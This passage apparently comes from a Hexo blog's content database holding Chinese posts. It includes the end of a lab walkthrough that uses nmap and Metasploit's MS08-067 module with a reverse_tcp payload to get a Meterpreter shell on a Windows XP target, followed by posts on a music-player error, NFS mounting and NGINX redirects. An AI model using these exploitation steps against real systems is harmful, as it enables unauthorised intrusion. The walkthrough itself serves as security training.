src=\"/2023/04/23/ms08-067/4.png\" alt=\"设置参数\"></p>\n<ol start=\"6\">\n<li>最后设置靶机的类型，在这我选择34。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/5.png\" alt=\"设置参数\"></p>\n<ol start=\"7\">\n<li>设置好就可以开始攻击了。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/6.png\" alt=\"设置参数\"></p>\n<p>最后返回meterpreter，攻击成功。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU&#x2F;Linux，可以使用命令<code>uname -a</code>查看。</p>\n<p>靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。</p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ed2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"域内扫描\"><a href=\"#域内扫描\" class=\"headerlink\" title=\"域内扫描\"></a>域内扫描</h3><p>攻击第一步，先扫描网络内存活并可以利用的主机。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -T4 -A -v -Pn 192.168.20.1/24</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><ol>\n<li>执行<code>msfconsole -q</code>。</li>\n<li>搜索<code>ms08-067</code>。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/1.png\" alt=\"开启工具\"></p>\n<ol start=\"3\">\n<li>设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用<code>show options</code>先查看都需要让我们设置哪些参数。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/2.png\" alt=\"使用模块\"></p>\n<ol start=\"4\">\n<li>设置参数。上图看到，我们需要设置<code>rhosts</code>（靶机IP）。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/3.png\" alt=\"设置参数\"></p>\n<ol start=\"5\">\n<li>然后设置payload reverse_tcp</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/4.png\" alt=\"设置参数\"></p>\n<ol start=\"6\">\n<li>最后设置靶机的类型，在这我选择34。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/5.png\" alt=\"设置参数\"></p>\n<ol start=\"7\">\n<li>设置好就可以开始攻击了。</li>\n</ol>\n<p><img src=\"/2023/04/23/ms08-067/6.png\" alt=\"设置参数\"></p>\n<p>最后返回meterpreter，攻击成功。</p>"},{"title":"出现\"An auido error has occurred,player will skip forward in 2 seconds.\"错误！","date":"2023-09-15T04:46:12.000Z","_content":"\n### 问题描述\n\n不知道怎么搞的，前几天刚刚弄好的博客音乐播放器，今天再次打开的时候，播放页面老是在弹出报错“An auido error has occurred,player will skip forward in 2 seconds.”。因为在将歌单放在博客之前，为了防止因为非VIP用户的正常播放，已经将歌单所有的音乐都改成了免费音乐，所以一般不会出现权限的问题，但是还是出现了这个问题，百思不得其解。\n\n<!-- more -->\n\n### 问题探索\n\n再网页用F12审查之后，因为也不是专业的，大概看出是因为API的调用出现了问题。所以在回到之前调用的歌单，我是用的鹅厂音乐，所以大概率是鹅厂的API调用的问题。   \n\n为了验证这个猜想，索性把网抑云的歌单拿来实验了一下，还真成功了。所以原因找到了，但是修改鹅厂的API调用还真的不会，希望大佬可以将错误复现，然后着手解决吧。\n\n[**之前搭建音乐播放器的步骤链接**](https://nustarain.gitee.io/2023/09/07/hexo-music/)","source":"_posts/music-API-error.md","raw":"---\ntitle: 出现\"An auido error has occurred,player will skip forward in 2 seconds.\"错误！\ndate: 2023-09-15 12:46:12\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n### 问题描述\n\n不知道怎么搞的，前几天刚刚弄好的博客音乐播放器，今天再次打开的时候，播放页面老是在弹出报错“An auido error has occurred,player will skip forward in 2 seconds.”。因为在将歌单放在博客之前，为了防止因为非VIP用户的正常播放，已经将歌单所有的音乐都改成了免费音乐，所以一般不会出现权限的问题，但是还是出现了这个问题，百思不得其解。\n\n<!-- more -->\n\n### 问题探索\n\n再网页用F12审查之后，因为也不是专业的，大概看出是因为API的调用出现了问题。所以在回到之前调用的歌单，我是用的鹅厂音乐，所以大概率是鹅厂的API调用的问题。   \n\n为了验证这个猜想，索性把网抑云的歌单拿来实验了一下，还真成功了。所以原因找到了，但是修改鹅厂的API调用还真的不会，希望大佬可以将错误复现，然后着手解决吧。\n\n[**之前搭建音乐播放器的步骤链接**](https://nustarain.gitee.io/2023/09/07/hexo-music/)","slug":"music-API-error","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g500757zj3b7vmgiun","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>不知道怎么搞的，前几天刚刚弄好的博客音乐播放器，今天再次打开的时候，播放页面老是在弹出报错“An auido error has occurred,player will skip forward in 2 seconds.”。因为在将歌单放在博客之前，为了防止因为非VIP用户的正常播放，已经将歌单所有的音乐都改成了免费音乐，所以一般不会出现权限的问题，但是还是出现了这个问题，百思不得其解。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"问题探索\"><a href=\"#问题探索\" class=\"headerlink\" title=\"问题探索\"></a>问题探索</h3><p>再网页用F12审查之后，因为也不是专业的，大概看出是因为API的调用出现了问题。所以在回到之前调用的歌单，我是用的鹅厂音乐，所以大概率是鹅厂的API调用的问题。   </p>\n<p>为了验证这个猜想，索性把网抑云的歌单拿来实验了一下，还真成功了。所以原因找到了，但是修改鹅厂的API调用还真的不会，希望大佬可以将错误复现，然后着手解决吧。</p>\n<p><a href=\"https://nustarain.gitee.io/2023/09/07/hexo-music/\"><strong>之前搭建音乐播放器的步骤链接</strong></a></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>不知道怎么搞的，前几天刚刚弄好的博客音乐播放器，今天再次打开的时候，播放页面老是在弹出报错“An auido error has occurred,player will skip forward in 2 seconds.”。因为在将歌单放在博客之前，为了防止因为非VIP用户的正常播放，已经将歌单所有的音乐都改成了免费音乐，所以一般不会出现权限的问题，但是还是出现了这个问题，百思不得其解。</p>","more":"<h3 id=\"问题探索\"><a href=\"#问题探索\" class=\"headerlink\" title=\"问题探索\"></a>问题探索</h3><p>再网页用F12审查之后，因为也不是专业的，大概看出是因为API的调用出现了问题。所以在回到之前调用的歌单，我是用的鹅厂音乐，所以大概率是鹅厂的API调用的问题。   </p>\n<p>为了验证这个猜想，索性把网抑云的歌单拿来实验了一下，还真成功了。所以原因找到了，但是修改鹅厂的API调用还真的不会，希望大佬可以将错误复现，然后着手解决吧。</p>\n<p><a href=\"https://nustarain.gitee.io/2023/09/07/hexo-music/\"><strong>之前搭建音乐播放器的步骤链接</strong></a></p>"},{"title":"NFS挂载到服务器","date":"2023-07-04T05:54:37.000Z","_content":"\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|NFS|存储服务器|ens224|仅主机|10.8.7.40/24|nfs-utils|\n|Web1|Web服务器|ens224|仅主机|10.8.7.80/24|nginx、nfs-utils|\n\n### NFS服务器部分\n\n1. 下载软件\n\n```bash\nyum install -y nfs-utils\n```\n\n<!-- more -->\n\n2. 编辑配置文件`vim /etc/exports`\n\n```bash\n/www 10.8.7.80(rw)\n```\n\n这个配置文件代表将自己主机下的`/www`目录共享给10.8.7.80主机，并且赋予读和写的权限。\n\n3. 要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了`777`，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。\n\n```bash\nchmod 777 /www\n```\n\n4. 启动服务\n\n```bash\nsystemctl start nfs-server\n```\n\n5. 导出配置文件\n\n```bash\nexportfs -rv\n```\n\n### Web服务器的部分\n\n1. 创建挂载点\n\n```bash\nmkdir /www\n```\n\n2. 编辑`/etc/fstab`实现永久挂载\n\n```bash\n10.8.7.40:/www  /www    nfs     rw,sync 0 0\n```\n\n3. 挂载共享目录\n\n```bash\nsystemctl daemon-reload\nmount -a\n```","source":"_posts/nfs.md","raw":"---\ntitle: NFS挂载到服务器\ndate: 2023-07-04 13:54:37\ncategories: 技术\ntags:\n  - Linux\n---\n\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|NFS|存储服务器|ens224|仅主机|10.8.7.40/24|nfs-utils|\n|Web1|Web服务器|ens224|仅主机|10.8.7.80/24|nginx、nfs-utils|\n\n### NFS服务器部分\n\n1. 下载软件\n\n```bash\nyum install -y nfs-utils\n```\n\n<!-- more -->\n\n2. 编辑配置文件`vim /etc/exports`\n\n```bash\n/www 10.8.7.80(rw)\n```\n\n这个配置文件代表将自己主机下的`/www`目录共享给10.8.7.80主机，并且赋予读和写的权限。\n\n3. 要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了`777`，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。\n\n```bash\nchmod 777 /www\n```\n\n4. 启动服务\n\n```bash\nsystemctl start nfs-server\n```\n\n5. 导出配置文件\n\n```bash\nexportfs -rv\n```\n\n### Web服务器的部分\n\n1. 创建挂载点\n\n```bash\nmkdir /www\n```\n\n2. 编辑`/etc/fstab`实现永久挂载\n\n```bash\n10.8.7.40:/www  /www    nfs     rw,sync 0 0\n```\n\n3. 挂载共享目录\n\n```bash\nsystemctl daemon-reload\nmount -a\n```","slug":"nfs","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g600787zj33vi8cj1s","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n<th align=\"center\">软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">NFS</td>\n<td align=\"center\">存储服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.40&#x2F;24</td>\n<td align=\"center\">nfs-utils</td>\n</tr>\n<tr>\n<td align=\"center\">Web1</td>\n<td align=\"center\">Web服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.80&#x2F;24</td>\n<td align=\"center\">nginx、nfs-utils</td>\n</tr>\n</tbody></table>\n<h3 id=\"NFS服务器部分\"><a href=\"#NFS服务器部分\" class=\"headerlink\" title=\"NFS服务器部分\"></a>NFS服务器部分</h3><ol>\n<li>下载软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y nfs-utils</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>编辑配置文件<code>vim /etc/exports</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/www 10.8.7.80(rw)</span><br></pre></td></tr></table></figure>\n\n<p>这个配置文件代表将自己主机下的<code>/www</code>目录共享给10.8.7.80主机，并且赋予读和写的权限。</p>\n<ol start=\"3\">\n<li>要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了<code>777</code>，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 777 /www</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>启动服务</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start nfs-server</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>导出配置文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exportfs -rv</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Web服务器的部分\"><a href=\"#Web服务器的部分\" class=\"headerlink\" title=\"Web服务器的部分\"></a>Web服务器的部分</h3><ol>\n<li>创建挂载点</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /www</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>编辑<code>/etc/fstab</code>实现永久挂载</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.8.7.40:/www  /www    nfs     rw,<span class=\"built_in\">sync</span> 0 0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>挂载共享目录</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">mount -a</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n<th align=\"center\">软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">NFS</td>\n<td align=\"center\">存储服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.40&#x2F;24</td>\n<td align=\"center\">nfs-utils</td>\n</tr>\n<tr>\n<td align=\"center\">Web1</td>\n<td align=\"center\">Web服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.80&#x2F;24</td>\n<td align=\"center\">nginx、nfs-utils</td>\n</tr>\n</tbody></table>\n<h3 id=\"NFS服务器部分\"><a href=\"#NFS服务器部分\" class=\"headerlink\" title=\"NFS服务器部分\"></a>NFS服务器部分</h3><ol>\n<li>下载软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y nfs-utils</span><br></pre></td></tr></table></figure>","more":"<ol start=\"2\">\n<li>编辑配置文件<code>vim /etc/exports</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/www 10.8.7.80(rw)</span><br></pre></td></tr></table></figure>\n\n<p>这个配置文件代表将自己主机下的<code>/www</code>目录共享给10.8.7.80主机，并且赋予读和写的权限。</p>\n<ol start=\"3\">\n<li>要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了<code>777</code>，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 777 /www</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>启动服务</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start nfs-server</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>导出配置文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exportfs -rv</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Web服务器的部分\"><a href=\"#Web服务器的部分\" class=\"headerlink\" title=\"Web服务器的部分\"></a>Web服务器的部分</h3><ol>\n<li>创建挂载点</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /www</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>编辑<code>/etc/fstab</code>实现永久挂载</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.8.7.40:/www  /www    nfs     rw,<span class=\"built_in\">sync</span> 0 0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>挂载共享目录</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">mount -a</span><br></pre></td></tr></table></figure>"},{"title":"NGINX配置的那些事","date":"2024-04-02T06:27:45.000Z","_content":"\n知道的越多，不知道的越多，NGINX的功能远比我所能理解的多太多了。  \n山高万仞，只登一步。披荆斩棘，行则将至。\n\n<!-- more -->\n\n### NGINX端口重定向（80 to 443）\n\n在生产环境中，一般不会使用http协议进行Web访问，都是使用https加密的方式进行Web访问，http和https各自监听的端口都不一样，那多余的80端口，该何去何从？一个比较合适的做法是端口重定向，使用NGINX的重写功能，将访问80端口的请求自动转发给443端口，下面是一个例子：\n\n```bash 折叠代码\nserver {\n    # HTTPS的默认访问端口443。如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。\n    listen 443 ssl;\n     \n    # 填写证书绑定的域名\n    server_name itellyou.cf;\n \n    # 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可\n    ssl_certificate /opt/ssl/itellyou.cf.pem;\n    ssl_certificate_key 